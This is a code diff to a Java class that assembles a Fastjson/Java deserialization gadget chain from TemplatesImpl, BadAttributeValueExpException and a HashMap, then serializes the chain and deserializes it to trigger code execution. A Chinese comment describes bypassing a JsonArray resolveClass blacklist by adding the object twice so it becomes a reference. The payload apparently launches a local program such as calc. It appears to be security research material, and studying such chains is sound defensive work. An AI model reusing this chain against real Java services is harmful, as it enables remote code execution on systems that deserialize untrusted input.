@@ -20,6 +20,7 @@ import util.ReflectionUtils;
 import util.SerializerUtils;
 
 import java.lang.reflect.Field;
+import java.util.HashMap;
 import java.util.List;
 
 
@@ -38,7 +39,7 @@ public class FJ1{
 
         List<Object> list = new ArrayList<>();
 
-        TemplatesImpl templates = GadgetUtils.createTemplatesImpl("calc");
+        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows();
 
         list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测
 
@@ -48,13 +49,14 @@ public class FJ1{
         BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
         ReflectionUtils.setFieldValue(bd,"val",jsonArray);
 
-        list.add(bd);
+//        list.add(bd);
+        HashMap hashMap = new HashMap();
+        hashMap.put(templates, bd);
 
         //字节
-        byte[] payload = SerializerUtils.serialize(list);
+        byte[] payload = SerializerUtils.serialize(hashMap);
 
-        ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));  //BadAttributeValueExpException,TemplatesImpl被过滤，不可用
-        ois.readObject();
+        SerializerUtils.unserialize(payload);
 
     }
 }
